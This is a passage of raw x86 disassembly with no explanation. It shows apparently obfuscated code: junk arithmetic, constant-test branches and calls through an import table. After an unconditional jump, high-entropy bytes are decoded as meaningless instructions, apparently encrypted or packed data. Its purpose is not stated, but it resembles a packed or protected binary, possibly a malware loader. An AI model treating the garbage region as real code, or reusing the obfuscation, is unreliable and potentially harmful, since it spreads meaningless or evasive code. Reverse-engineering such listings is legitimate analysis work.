  41b70b:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41b712:	cmp    DWORD PTR ds:0x428425,0x0
  41b719:	mov    DWORD PTR ds:0x428309,0x12e0
  41b723:	movzx  edx,WORD PTR ds:0x4283e9
  41b72a:	jmp    0x41b78a
  41b72f:	not    eax
  41b731:	mov    DWORD PTR ds:0x428485,edi
  41b737:	cmp    DWORD PTR ds:0x428425,0x0
  41b73e:	jne    0x41b768
  41b744:	push   0x428107
  41b749:	call   DWORD PTR ds:0x42e298
  41b74f:	movzx  edx,WORD PTR ds:0x4282fd
  41b756:	xor    DWORD PTR ds:0x4282e1,edx
  41b75c:	and    ecx,0x442f
  41b762:	sub    edx,0x55c5
  41b768:	mov    ecx,DWORD PTR ds:0x42848d
  41b76e:	xor    ecx,DWORD PTR ds:0x428495
  41b774:	mov    DWORD PTR ds:0x42848d,ecx
  41b77a:	and    DWORD PTR ds:0x42830d,0x34b7
  41b784:	adc    DWORD PTR ds:0x4284b1,ebx
  41b78a:	mov    DWORD PTR [ebp-0xb4],0x3842
  41b794:	adc    ecx,edx
  41b796:	mov    eax,DWORD PTR [ebp-0x4c]
  41b799:	and    ecx,edx
  41b79b:	add    eax,DWORD PTR [ebp-0xb4]
  41b7a1:	xor    eax,0x2e02
  41b7a6:	add    ecx,ecx
  41b7a8:	xor    eax,0x7294
  41b7ad:	add    ecx,ecx
  41b7af:	imul   eax,eax,0x68f3
  41b7b5:	mov    ecx,DWORD PTR [ebp-0x8c]
  41b7bb:	cmp    DWORD PTR ds:0x428311,0x0
  41b7c2:	mov    DWORD PTR ds:0x428419,ebx
  41b7c8:	mov    edx,DWORD PTR ds:0x42852d
  41b7ce:	jmp    0x41b822
  41b7d3:	mov    DWORD PTR ds:0x428305,edx
  41b7d9:	cmp    DWORD PTR ds:0x428311,0x0
  41b7e0:	ja     0x41b810
  41b7e6:	push   DWORD PTR [ebp-0x1c]
  41b7e9:	push   0x2a61
  41b7ee:	push   0x6c90
  41b7f3:	push   0x2be6
  41b7f8:	push   0x2810
  41b7fd:	call   DWORD PTR ds:0x42e054
  41b803:	inc    edx
  41b804:	mov    edx,DWORD PTR ds:0x428301
  41b80a:	sbb    DWORD PTR ds:0x428409,edx
  41b810:	or     edx,DWORD PTR ds:0x428321
  41b816:	and    edx,DWORD PTR ds:0x428485
  41b81c:	sub    edx,DWORD PTR ds:0x428519
  41b822:	and    eax,ecx
  41b824:	adc    DWORD PTR ds:0x42841d,0x2bc9
  41b82e:	sub    eax,0x2818
  41b833:	mov    edx,DWORD PTR ds:0x4284cd
  41b839:	mov    ecx,DWORD PTR ds:0x4284d9
  41b83f:	sub    ecx,edx
  41b841:	add    edx,DWORD PTR [edx+ecx*1]
  41b844:	mov    DWORD PTR [ebp-0xe8],eax
  41b84a:	mov    DWORD PTR [ebp-0x70],0x6f89
  41b851:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41b85b:	mov    DWORD PTR [ebp-0x120],0x3c77
  41b865:	sbb    DWORD PTR ds:0x4283d9,edx
  41b86b:	mov    DWORD PTR [ebp-0x2c],0x2129
  41b872:	cmp    DWORD PTR ds:0x428431,0x0
  41b879:	mov    DWORD PTR ds:0x428325,0x25cb
  41b883:	mov    edx,0x2db2
  41b888:	mov    DWORD PTR ds:0x4284b1,0x75fd
  41b892:	jmp    0x41b8de
  41b897:	mov    eax,0x420d
  41b89c:	mov    DWORD PTR ds:0x42848d,0x38f0
  41b8a6:	cmp    DWORD PTR ds:0x428431,0x0
  41b8ad:	jge    0x41b8c8
  41b8b3:	push   DWORD PTR [ebp-0xc]
  41b8b6:	call   DWORD PTR ds:0x42e058
  41b8bc:	adc    DWORD PTR ds:0x4284fd,edx
  41b8c2:	add    DWORD PTR ds:0x428521,edx
  41b8c8:	sbb    edx,DWORD PTR ds:0x428515
  41b8ce:	and    DWORD PTR ds:0x42847d,0x10d1
  41b8d8:	and    ecx,0x7be2
  41b8de:	mov    eax,DWORD PTR [ebp-0x2c]
  41b8e1:	imul   eax,eax,0x1ada
  41b8e7:	xor    DWORD PTR ds:0x428419,ebx
  41b8ed:	mov    ecx,DWORD PTR [ebp-0x120]
  41b8f3:	mov    edx,DWORD PTR ds:0x4283c5
  41b8f9:	or     edx,DWORD PTR ds:0x428411
  41b8ff:	mov    DWORD PTR ds:0x4283c5,edx
  41b905:	imul   ecx,ecx,0x53ae
  41b90b:	xor    DWORD PTR ds:0x428485,0x220b
  41b915:	imul   ecx,ecx,0x7447
  41b91b:	mov    edx,DWORD PTR [ebp-0xd0]
  41b921:	and    ecx,edx
  41b923:	or     ecx,0x2a20
  41b929:	or     DWORD PTR ds:0x428485,0x6762
  41b933:	mov    edx,DWORD PTR [ebp-0x70]
  41b936:	xor    ecx,edx
  41b938:	and    DWORD PTR ds:0x4282ed,0x71f
  41b942:	mov    edx,DWORD PTR [ebp+0x14]
  41b945:	or     DWORD PTR ds:0x428401,0x17f4
  41b94f:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41b956:	or     DWORD PTR ds:0x4284a1,0x428431
  41b960:	lea    eax,[ecx+eax*1-0x45a1]
  41b967:	mov    DWORD PTR [ebp-0xb0],eax
  41b96d:	add    ecx,eax
  41b96f:	mov    DWORD PTR [ebp-0x11c],0x303f
  41b979:	mov    DWORD PTR [ebp-0x98],0x51a9
  41b983:	sub    ecx,eax
  41b985:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41b98f:	cmp    DWORD PTR ds:0x428325,0x0
  41b996:	mov    DWORD PTR ds:0x428309,0x245f
  41b9a0:	mov    ecx,DWORD PTR ds:0x4283dd
  41b9a6:	mov    ecx,0x273f
  41b9ab:	jmp    0x41ba0f
  41b9b0:	mov    DWORD PTR ds:0x428419,ebx
  41b9b6:	mov    DWORD PTR ds:0x4283e9,0x963
  41b9c0:	cmp    DWORD PTR ds:0x428325,0x0
  41b9c7:	jle    0x41b9ee
  41b9cd:	push   DWORD PTR [ebp-0x28]
  41b9d0:	push   0x42847d
  41b9d5:	push   0x428165
  41b9da:	call   DWORD PTR ds:0x42e29c
  41b9e0:	sub    DWORD PTR ds:0x42850d,ebx
  41b9e6:	xor    ecx,ecx
  41b9e8:	sbb    DWORD PTR ds:0x428495,ebx
  41b9ee:	movzx  ecx,BYTE PTR ds:0x42830d
  41b9f5:	adc    DWORD PTR ds:0x4283f9,ecx
  41b9fb:	add    DWORD PTR ds:0x428301,0x7cea
  41ba05:	sbb    DWORD PTR ds:0x428305,0x6b1e
  41ba0f:	mov    eax,DWORD PTR [ebp-0xcc]
  41ba15:	xor    eax,0x6f65
  41ba1a:	cmp    DWORD PTR ds:0x4282fd,0x0
  41ba21:	mov    DWORD PTR ds:0x4283f5,edx
  41ba27:	mov    ecx,0x51b5
  41ba2c:	jmp    0x41baa2
  41ba31:	mov    DWORD PTR ds:0x4283fd,0xb0f
  41ba3b:	cmp    DWORD PTR ds:0x4282fd,0x0
  41ba42:	jl     0x41ba7a
  41ba48:	push   0x200e
  41ba4d:	push   0x21c1
  41ba52:	push   DWORD PTR [ebp-0x14]
  41ba55:	push   DWORD PTR [ebp-0x14]
  41ba58:	call   DWORD PTR ds:0x42e110
  41ba5e:	sub    DWORD PTR ds:0x4283c9,ecx
  41ba64:	sub    ecx,DWORD PTR ds:0x4284f5
  41ba6a:	sbb    DWORD PTR ds:0x4283d1,0x4284ad
  41ba74:	sub    ecx,0x1dd7
  41ba7a:	mov    ecx,DWORD PTR ds:0x428415
  41ba80:	adc    ecx,DWORD PTR ds:0x428529
  41ba86:	mov    DWORD PTR ds:0x428415,ecx
  41ba8c:	adc    DWORD PTR ds:0x428519,0x3dd1
  41ba96:	mov    DWORD PTR ds:0x428319,0x5b91
  41baa0:	neg    ecx
  41baa2:	mov    ecx,DWORD PTR [ebp-0x98]
  41baa8:	add    DWORD PTR ds:0x428525,0x72a
  41bab2:	or     eax,ecx
  41bab4:	xor    DWORD PTR ds:0x428419,ebx
  41baba:	add    eax,0x161e
  41babf:	sub    ecx,0x1ef7
  41bac5:	mov    ecx,DWORD PTR [ebp-0x11c]
  41bacb:	or     eax,ecx
  41bacd:	cmp    DWORD PTR ds:0x4283c9,0x0
  41bad4:	mov    ecx,DWORD PTR ds:0x4283e1
  41bada:	mov    DWORD PTR ds:0x428405,0x4d
  41bae4:	jmp    0x41bbad
  41bae9:	mov    DWORD PTR ds:0x428405,0x133b
  41baf3:	cmp    DWORD PTR ds:0x4283c9,0x0
  41bafa:	jne    0x41bb25
  41bb00:	push   0x428511
  41bb05:	push   0x8a51
  41bb0a:	push   0x81dc
  41bb0f:	call   DWORD PTR ds:0x42e05c
  41bb15:	and    DWORD PTR ds:0x4283dd,0x4030
  41bb1f:	sub    DWORD PTR ds:0x428489,edx
  41bb25:	add    ecx,0x753f
  41bb2b:	mov    ecx,DWORD PTR ds:0x4283c5
  41bb31:	xor    DWORD PTR ds:0x4283c1,ecx
  41bb37:	sbb    DWORD PTR ds:0x42850d,edx
  41bb3d:	cmp    DWORD PTR ds:0x428521,0x0
  41bb44:	mov    ecx,DWORD PTR ds:0x428525
  41bb4a:	mov    ecx,DWORD PTR ds:0x4284a1
  41bb50:	mov    DWORD PTR ds:0x42841d,edx
  41bb56:	mov    DWORD PTR ds:0x4283d5,edi
  41bb5c:	jmp    0x41bbad
  41bb61:	not    ecx
  41bb63:	cmp    DWORD PTR ds:0x428521,0x0
  41bb6a:	jne    0x41bb96
  41bb70:	push   0x6108
  41bb75:	push   0x2ee0
  41bb7a:	push   0x428245
  41bb7f:	push   0x1382
  41bb84:	call   DWORD PTR ds:0x42e060
  41bb8a:	or     DWORD PTR ds:0x428479,edi
  41bb90:	neg    DWORD PTR ds:0x428305
  41bb96:	movzx  ecx,WORD PTR ds:0x428509
  41bb9d:	sbb    DWORD PTR ds:0x428421,ecx
  41bba3:	or     DWORD PTR ds:0x4283f5,0x428401
  41bbad:	add    eax,0x1cca
  41bbb2:	cmp    DWORD PTR ds:0x428301,0x0
  41bbb9:	mov    DWORD PTR ds:0x428401,0x3c56
  41bbc3:	mov    ecx,0x7f6d
  41bbc8:	mov    ecx,DWORD PTR ds:0x4283fd
  41bbce:	jmp    0x41bc28
  41bbd3:	not    ecx
  41bbd5:	cmp    DWORD PTR ds:0x428301,0x0
  41bbdc:	jbe    0x41bc10
  41bbe2:	push   0x5de5
  41bbe7:	push   0x42822f
  41bbec:	push   0x27d6
  41bbf1:	call   DWORD PTR ds:0x42e114
  41bbf7:	movzx  ecx,BYTE PTR ds:0x428321
  41bbfe:	adc    DWORD PTR ds:0x428315,ecx
  41bc04:	sbb    ecx,0x4cc7
  41bc0a:	sbb    ecx,DWORD PTR ds:0x4283fd
  41bc10:	adc    DWORD PTR ds:0x428529,ebx
  41bc16:	mov    ecx,DWORD PTR ds:0x4282ed
  41bc1c:	sub    DWORD PTR ds:0x428531,ecx
  41bc22:	add    ecx,0x5653
  41bc28:	xor    eax,0x96c9
  41bc2d:	sbb    DWORD PTR ds:0x428529,0x433e
  41bc37:	mov    DWORD PTR [ebp-0x38],eax
  41bc3a:	mov    DWORD PTR [ebp-0x118],0x6083
  41bc44:	sub    DWORD PTR ds:0x4282dd,0x67a3
  41bc4e:	mov    DWORD PTR [ebp-0x88],0x556
  41bc58:	or     ecx,eax
  41bc5a:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41bc64:	cmp    DWORD PTR ds:0x428481,0x0
  41bc6b:	mov    ecx,0x31c9
  41bc70:	mov    DWORD PTR ds:0x428529,0x1996
  41bc7a:	jmp    0x41bccd
  41bc7f:	mov    DWORD PTR ds:0x42847d,edi
  41bc85:	cmp    DWORD PTR ds:0x428481,0x0
  41bc8c:	jb     0x41bcb3
  41bc92:	push   0x4282a3
  41bc97:	push   DWORD PTR [ebp-0x14]
  41bc9a:	call   DWORD PTR ds:0x42e118
  41bca0:	add    ecx,DWORD PTR ds:0x428405
  41bca6:	movzx  ecx,BYTE PTR ds:0x428429
  41bcad:	add    DWORD PTR ds:0x428315,ecx
  41bcb3:	sub    DWORD PTR ds:0x428485,ecx
  41bcb9:	xor    ecx,ecx
  41bcbb:	add    ecx,DWORD PTR ds:0x4283b9
  41bcc1:	or     DWORD PTR ds:0x4284f9,ecx
  41bcc7:	add    DWORD PTR ds:0x4283c1,ebx
  41bccd:	mov    eax,DWORD PTR [ebp-0x140]
  41bcd3:	add    eax,0x5af8
  41bcd8:	sbb    ecx,0x75c4
  41bcde:	mov    ecx,DWORD PTR [ebp-0x88]
  41bce4:	sub    eax,ecx
  41bce6:	mov    ecx,DWORD PTR [ebp-0x118]
  41bcec:	xor    DWORD PTR ds:0x428515,0x6d4
  41bcf6:	lea    eax,[eax+ecx*1+0x68dc]
  41bcfd:	or     eax,0x52f6
  41bd02:	cmp    DWORD PTR ds:0x428409,0x0
  41bd09:	mov    DWORD PTR ds:0x4284f5,0x1421
  41bd13:	mov    DWORD PTR ds:0x428431,0x487c
  41bd1d:	mov    ecx,DWORD PTR ds:0x4283e5
  41bd23:	jmp    0x41bd91
  41bd28:	mov    DWORD PTR ds:0x4283fd,0x10ed
  41bd32:	not    ecx
  41bd34:	cmp    DWORD PTR ds:0x428409,0x0
  41bd3b:	jbe    0x41bd77
  41bd41:	push   0x8eb3
  41bd46:	call   DWORD PTR ds:0x42e11c
  41bd4c:	mov    ecx,DWORD PTR ds:0x428485
  41bd52:	sub    DWORD PTR ds:0x428311,ecx
  41bd58:	mov    ecx,DWORD PTR ds:0x4283e1
  41bd5e:	sbb    ecx,DWORD PTR ds:0x428411
  41bd64:	mov    DWORD PTR ds:0x4283e1,ecx
  41bd6a:	movzx  ecx,BYTE PTR ds:0x4282fd
  41bd71:	or     DWORD PTR ds:0x428475,ecx
  41bd77:	sbb    DWORD PTR ds:0x4282f5,ebx
  41bd7d:	neg    ecx
  41bd7f:	mov    ecx,DWORD PTR ds:0x428305
  41bd85:	xor    ecx,DWORD PTR ds:0x4283b9
  41bd8b:	mov    DWORD PTR ds:0x428305,ecx
  41bd91:	sub    eax,0x1dbfe
  41bd96:	sbb    DWORD PTR ds:0x428499,ecx
  41bd9c:	mov    DWORD PTR [ebp-0xac],eax
  41bda2:	xor    DWORD PTR ds:0x4283dd,ebx
  41bda8:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41bdaf:	mov    DWORD PTR [ebp-0x100],0x49f7
  41bdb9:	inc    ecx
  41bdba:	mov    eax,DWORD PTR [ebp-0x100]
  41bdc0:	movzx  ecx,BYTE PTR ds:0x428505
  41bdc7:	sub    ecx,DWORD PTR ds:0x428479
  41bdcd:	mov    DWORD PTR ds:0x428505,ecx
  41bdd3:	add    eax,0x7b60
  41bdd8:	sbb    ecx,0x7111
  41bdde:	imul   eax,eax,0x5ea
  41bde4:	add    DWORD PTR ds:0x428425,ecx
  41bdea:	mov    ecx,DWORD PTR [ebp-0x6c]
  41bded:	imul   eax,ecx
  41bdf0:	xor    edx,edx
  41bdf2:	adc    DWORD PTR ds:0x4283c1,0x2190
  41bdfc:	mov    ecx,0x3218d
  41be01:	div    ecx
  41be03:	sub    eax,0x24c1
  41be08:	sbb    ecx,0x10cc
  41be0e:	mov    DWORD PTR [ebp-0xa8],eax
  41be14:	xor    eax,eax
  41be16:	add    eax,DWORD PTR ds:0x42848d
  41be1c:	sbb    eax,DWORD PTR ds:0x428425
  41be22:	mov    ds:0x42848d,eax
  41be27:	mov    DWORD PTR [ebp-0x84],0x2c40
  41be31:	xor    ecx,ecx
  41be33:	or     ecx,DWORD PTR ds:0x4283c1
  41be39:	xor    ecx,DWORD PTR ds:0x428421
  41be3f:	mov    DWORD PTR ds:0x4283c1,ecx
  41be45:	mov    DWORD PTR [ebp-0x18],0x6013
  41be4c:	or     DWORD PTR ds:0x428509,ecx
  41be52:	mov    DWORD PTR [ebp-0x80],0xc
  41be59:	and    eax,eax
  41be5b:	mov    eax,DWORD PTR [ebp-0x18]
  41be5e:	and    DWORD PTR ds:0x428475,edi
  41be64:	mov    ecx,DWORD PTR [ebp-0x80]
  41be67:	xor    edx,edx
  41be69:	add    DWORD PTR ds:0x42831d,0x428311
  41be73:	div    ecx
  41be75:	imul   eax,eax,0x4312
  41be7b:	cmp    DWORD PTR ds:0x428491,0x0
  41be82:	mov    DWORD PTR ds:0x4283c1,0x6e4f
  41be8c:	movzx  ecx,WORD PTR ds:0x428529
  41be93:	mov    DWORD PTR ds:0x428505,edi
  41be99:	jmp    0x41befc
  41be9e:	mov    DWORD PTR ds:0x4282ed,0x5f09
  41bea8:	cmp    DWORD PTR ds:0x428491,0x0
  41beaf:	jge    0x41bed8
  41beb5:	push   DWORD PTR [ebp-0x28]
  41beb8:	call   DWORD PTR ds:0x42e064
  41bebe:	sbb    ecx,DWORD PTR ds:0x42847d
  41bec4:	xor    ecx,ecx
  41bec6:	xor    ecx,DWORD PTR ds:0x4283e1
  41becc:	sub    DWORD PTR ds:0x428315,ecx
  41bed2:	and    DWORD PTR ds:0x4283e9,edi
  41bed8:	xor    ecx,ecx
  41beda:	xor    ecx,DWORD PTR ds:0x428519
  41bee0:	xor    DWORD PTR ds:0x4283b5,ecx
  41bee6:	or     DWORD PTR ds:0x4283f5,0x15e9
  41bef0:	xor    ecx,0x6843
  41bef6:	adc    ecx,DWORD PTR ds:0x4283f9
  41befc:	add    eax,0x5abe
  41bf01:	mov    ecx,DWORD PTR [ebp-0x84]
  41bf07:	add    DWORD PTR ds:0x428491,0x428529
  41bf11:	xor    eax,ecx
  41bf13:	mov    ecx,DWORD PTR ds:0x428309
  41bf19:	and    ecx,DWORD PTR ds:0x42850d
  41bf1f:	mov    DWORD PTR ds:0x428309,ecx
  41bf25:	xor    edx,edx
  41bf27:	not    DWORD PTR ds:0x428319
  41bf2d:	mov    ecx,0x5ae
  41bf32:	div    ecx
  41bf34:	jmp    0x41c31b
  41bf39:	xchg   DWORD PTR [edi],esp
  41bf3b:	dec    eax
  41bf3c:	in     al,0x68
  41bf3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3f:	lods   al,BYTE PTR ds:[esi]
  41bf40:	stos   DWORD PTR es:[edi],eax
  41bf41:	test   BYTE PTR [ebx+eax*8+0x48fa53cf],bh
  41bf48:	xchg   edx,eax
  41bf49:	aam    0x3b
  41bf4b:	sar    BYTE PTR [esi-0x41413bb6],0xbf
  41bf52:	mov    bl,dh
  41bf54:	(bad)  
  41bf56:	popa   
  41bf57:	iret   
  41bf58:	xor    al,0x57
  41bf5a:	push   cs
  41bf5b:	pavgw  mm3,QWORD PTR [ebp+0x2b]
  41bf5f:	mov    ebx,0xb468b4a
  41bf64:	ror    cl,0x99
  41bf67:	call   0xbf5e3351
  41bf6c:	ret    0x486d
  41bf6f:	push   ecx
  41bf70:	xchg   esi,eax
  41bf71:	push   ebx
  41bf72:	lds    ebp,FWORD PTR [esi]
  41bf74:	pop    esi
  41bf75:	inc    edi
  41bf76:	into   
  41bf77:	cdq    
  41bf78:	xor    esi,ebx
  41bf7a:	mov    edi,0xc663872a
  41bf7f:	(bad)  
  41bf80:	enter  0x897e,0xc
  41bf84:	idiv   edi
  41bf86:	inc    ebp
  41bf87:	(bad)  
  41bf89:	push   edi
  41bf8a:	mov    WORD PTR ds:0x7e8c502a,?
  41bf90:	xchg   esp,eax
  41bf91:	dec    DWORD PTR [ebx+0x5b]
  41bf94:	retf   
  41bf95:	sbb    DWORD PTR [edx],eax
  41bf97:	xor    al,0xcd
  41bf99:	pop    edi
  41bf9a:	out    dx,al
  41bf9b:	rol    DWORD PTR [edx-0x7e00b6dc],0xe3
  41bfa2:	pop    edi
  41bfa3:	add    BYTE PTR [edi+0x36f33140],0xca
  41bfaa:	xor    BYTE PTR ds:0xa110327f,bl
  41bfb0:	pop    esp
  41bfb1:	or     dl,0x5e
  41bfb4:	outs   dx,DWORD PTR ds:[esi]
  41bfb5:	rol    BYTE PTR [ecx+0x46891696],cl
  41bfbb:	js     0x41bfb6
  41bfbd:	fstp   TBYTE PTR [ecx-0x8]
  41bfc0:	lds    ebp,FWORD PTR [edi-0x4b]
  41bfc3:	sub    BYTE PTR [ebp-0x62],dl
  41bfc6:	aaa    
  41bfc7:	sbb    BYTE PTR [eax],0x93
  41bfca:	enter  0x97ae,0x89
  41bfce:	and    ecx,esi
  41bfd0:	pop    ss
  41bfd1:	mov    DWORD PTR [ebx+edi*8-0x1ce35361],ebp
  41bfd8:	dec    ecx
  41bfd9:	scas   eax,DWORD PTR es:[edi]
  41bfda:	mov    ebp,0x1cef7264
  41bfdf:	stos   BYTE PTR es:[edi],al
  41bfe0:	shr    BYTE PTR [esi+esi*1+0x2eb0ca34],1
  41bfe7:	adc    al,BYTE PTR [edx+esi*1-0x66ea72ca]
  41bfee:	dec    ebp
  41bfef:	gs scas al,BYTE PTR es:[edi]
  41bff1:	lahf   
  41bff2:	or     eax,0x6c97326f
  41bff7:	rol    BYTE PTR [ebx],1
  41bff9:	imul   ebp,DWORD PTR [ebx],0xce5e175c
  41bfff:	push   ecx
  41c000:	pop    ebp
  41c001:	cmp    DWORD PTR [edi-0x3f],ecx
  41c004:	and    eax,0x220c7a59
  41c009:	and    al,0x8a
  41c00b:	cwde   
  41c00c:	push   eax
  41c00d:	in     eax,0x46
  41c00f:	cmp    BYTE PTR [edi],0xf3
  41c012:	inc    eax
  41c013:	sub    DWORD PTR [edx+edx*1+0x69],esp
  41c017:	jae    0x41c001
  41c019:	sub    BYTE PTR [esi+edx*1+0x52570821],dl
  41c020:	push   0x4abc67a7
  41c025:	push   cs
  41c026:	mov    esp,DWORD PTR [ebp+0x1070236f]
  41c02c:	inc    ecx
  41c02d:	adc    al,0xcd
  41c02f:	cmp    edx,DWORD PTR [ebp-0x4a]
  41c032:	dec    edi
  41c033:	jmp    0x6683:0x5f1fd1c8
  41c03a:	and    dl,bh
  41c03c:	xor    dl,BYTE PTR ds:0x419951ec
  41c042:	fmul   QWORD PTR [edx]
  41c044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c045:	push   esp
  41c046:	inc    ecx
  41c047:	and    BYTE PTR [edi+0x65b26e49],0x2e
  41c04e:	inc    edi
  41c04f:	(bad)  
  41c050:	(bad)  
  41c051:	out    dx,al
  41c052:	xchg   esp,eax
  41c053:	jb     0x41c090
  41c055:	pushf  
  41c056:	sbb    al,al
  41c058:	das    
  41c059:	int3   
  41c05a:	mov    ah,0xad
  41c05c:	mov    ds:0xc04ffded,eax
  41c061:	scas   al,BYTE PTR es:[edi]
  41c062:	xlat   BYTE PTR ds:[ebx]
  41c063:	push   es
  41c064:	pop    ecx
  41c065:	aas    
  41c066:	sar    DWORD PTR [ecx+0x3b],0xb8
  41c06a:	inc    esi
  41c06b:	and    ebp,eax
  41c06d:	inc    ebp
  41c06e:	test   eax,0x3bba6e7a
  41c073:	call   DWORD PTR [ebx+eax*8]
  41c076:	sub    bl,bl
  41c078:	jae    0x41c035
  41c07a:	jp     0x41c067
  41c07c:	pop    ebp
  41c07d:	gs dec ecx
  41c07f:	xor    al,BYTE PTR [edi]
  41c081:	jp     0x41c010
  41c083:	loope  0x41c089
  41c085:	fcmovne st,st(7)
  41c087:	mov    BYTE PTR [esp+ebx*8],ah
  41c08a:	xor    BYTE PTR [edx],0xff
  41c08d:	push   esi
  41c08e:	jbe    0x41c0c3
  41c090:	cli    
  41c091:	add    al,0x1e
  41c093:	mov    ds:0xdbd7d59f,eax
  41c098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c099:	fisub  DWORD PTR [ebp-0x6a08e83d]
  41c09f:	mov    ah,0x53
  41c0a1:	das    
  41c0a2:	jmp    0x41c0e1
  41c0a4:	push   ebx
  41c0a5:	rcr    BYTE PTR [ecx+0x72],0xf8
  41c0a9:	fisubr WORD PTR [edi+ebp*8-0x29f9c36f]
  41c0b0:	retf   
  41c0b1:	push   edi
  41c0b2:	sbb    esp,DWORD PTR [ebp+0x6f5601aa]
  41c0b8:	cmc    
  41c0b9:	shr    DWORD PTR [edi],1
  41c0bb:	push   ecx
  41c0bc:	cs mov eax,0x9f210f4e
  41c0c2:	hlt    
  41c0c3:	je     0x41c0ef
  41c0c5:	imul   eax,DWORD PTR [ebp-0x2d7ef5b2],0x15153445
  41c0cf:	test   al,0xb5
  41c0d1:	inc    edi
  41c0d2:	adc    esi,DWORD PTR [ebp-0x27c5c2d8]
  41c0d8:	popa   
  41c0d9:	mov    ebp,0xd8ef8bab
  41c0de:	jno    0x41c0ce
  41c0e0:	stc    
  41c0e1:	adc    ebx,DWORD PTR [ebx-0x22fda5e]
  41c0e7:	rcl    ebx,cl
  41c0e9:	out    dx,al
  41c0ea:	mov    dh,0x8
  41c0ec:	add    eax,0x6fa45a06
  41c0f1:	retf   
  41c0f2:	call   0x2d92:0x37066e14
  41c0f9:	mov    eax,ds:0x31060a3a
  41c0fe:	test   BYTE PTR [eax*2+0x59d40ec],0x47
  41c106:	into   
  41c107:	leave  
  41c108:	xchg   esp,eax
  41c109:	jne    0x41c15a
  41c10b:	ds scas eax,DWORD PTR es:[edi]
  41c10d:	aaa    
  41c10e:	jo     0x41c0c9
  41c110:	cmp    BYTE PTR [eax+0x5efe3ff3],cl
  41c116:	pop    edi
  41c117:	(bad)  
  41c118:	out    dx,al
  41c119:	xchg   esp,eax
  41c11a:	addr16 out 0xad,al
  41c11d:	scas   eax,DWORD PTR es:[edi]
  41c11e:	jb     0x41c150
  41c120:	xor    eax,DWORD PTR [ebx]
  41c122:	test   eax,0x52ad27a2
  41c127:	ja     0x41c145
  41c129:	(bad)  
  41c12a:	adc    dl,bh
  41c12c:	jp     0x41c142
  41c12e:	test   eax,0x454b894d
  41c133:	xchg   ebp,eax
  41c134:	bound  ebx,QWORD PTR [edi-0x6190d7e7]
  41c13a:	dec    edx
  41c13b:	mov    edi,esi
  41c13d:	ins    BYTE PTR es:[edi],dx
  41c13e:	jne    0x41c1a4
  41c140:	out    dx,al
  41c141:	(bad)  
  41c142:	jmp    0xc94a:0x30c52b08
  41c149:	xchg   edx,eax
  41c14a:	or     al,0x1d
  41c14c:	sbb    BYTE PTR ds:0xee8b36ba,0xe6
  41c153:	mov    edx,0xf786b8af
  41c158:	loopne 0x41c116
  41c15a:	out    0xd6,al
  41c15c:	mov    ebp,0x48d913ed
  41c161:	ret    0x2a6
  41c164:	xor    ebp,ecx
  41c166:	(bad)  
  41c167:	and    DWORD PTR [esi],0x9a0fda95
  41c16d:	mov    al,0x9d
  41c16f:	push   esp
  41c170:	cmp    edi,DWORD PTR [ecx-0x65e7caf4]
  41c176:	shr    BYTE PTR [esi+0x40d3ab63],cl
  41c17c:	dec    eax
  41c17d:	pop    ebp
  41c17e:	repz pusha 
  41c180:	dec    ebx
  41c181:	mov    edx,0xc26d341c
  41c186:	in     al,dx
  41c187:	adc    dl,BYTE PTR [edi+0x576f28e5]
  41c18d:	jmp    0x4b5b3a2a
  41c192:	bound  eax,QWORD PTR [esi]
  41c194:	(bad)  
  41c195:	inc    DWORD PTR ds:0x1ccd8d48
  41c19b:	sbb    DWORD PTR [ecx-0x70a57c37],esi
  41c1a1:	(bad)  
  41c1a2:	mul    BYTE PTR [eax+0x5c859295]
  41c1a8:	inc    eax
  41c1a9:	add    eax,0x8141392f
  41c1ae:	pop    es
  41c1af:	mov    ah,BYTE PTR [ecx]
  41c1b1:	das    
  41c1b2:	push   edx
  41c1b3:	fstp   TBYTE PTR [edi+0x2d4f5e29]
  41c1b9:	cmp    dl,BYTE PTR [ecx]
  41c1bb:	(bad)  
  41c1bc:	jg     0x41c203
  41c1be:	pop    esp
  41c1bf:	je     0x41c1a6
  41c1c1:	adc    BYTE PTR [edi],0x3a
  41c1c4:	inc    eax
  41c1c5:	rol    ebx,1
  41c1c7:	daa    
  41c1c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ca:	cmp    al,0xcc
  41c1cc:	(bad)  
  41c1cd:	jg     0x41c182
  41c1cf:	cmp    BYTE PTR [esi],dh
  41c1d1:	xchg   ecx,eax
  41c1d2:	add    edx,esp
  41c1d4:	mov    ecx,0x10a27eb8
  41c1d9:	out    dx,al
  41c1da:	mov    dl,0x53
  41c1dc:	mov    ecx,0x2ad2ac50
  41c1e1:	and    dl,bh
  41c1e3:	daa    
  41c1e4:	push   0xd976e912
  41c1e9:	mov    dh,0x65
  41c1eb:	mov    ah,0x7e
  41c1ed:	or     bh,BYTE PTR [edx]
  41c1ef:	sub    DWORD PTR [ecx+0x63],0xe8e223c8
  41c1f6:	pop    ecx
  41c1f7:	pop    eax
  41c1f8:	stos   DWORD PTR es:[edi],eax
  41c1f9:	cmp    DWORD PTR [ecx-0x4f27cb24],0x9d9db572
  41c203:	dec    ecx
  41c204:	shr    BYTE PTR [ecx],0xd3
  41c207:	mov    dh,BYTE PTR [edi-0x9]
  41c20a:	cdq    
  41c20b:	das    
  41c20c:	imul   eax,ecx,0xb6066468
  41c212:	add    dh,BYTE PTR [ebp-0x43b1b734]
  41c218:	cld    
  41c219:	cmp    ecx,DWORD PTR [ebp+0x65]
  41c21c:	or     cl,BYTE PTR [edi+0x5273c9ed]
  41c222:	pusha  
  41c223:	nop
  41c224:	inc    edx
  41c225:	fisttp WORD PTR [eax]
  41c227:	and    BYTE PTR [esi],al
  41c229:	jl     0x41c27b
  41c22b:	push   0x53c80a18
  41c230:	dec    edx
  41c231:	mov    ds:0x6bcfd61f,al
  41c236:	cmp    esp,DWORD PTR [edi+0x142513c5]
  41c23c:	push   ds
  41c23d:	add    ebp,DWORD PTR [esi+0x326f13cf]
  41c243:	imul   ecx,DWORD PTR [esi-0x6fe5b9fb],0x11
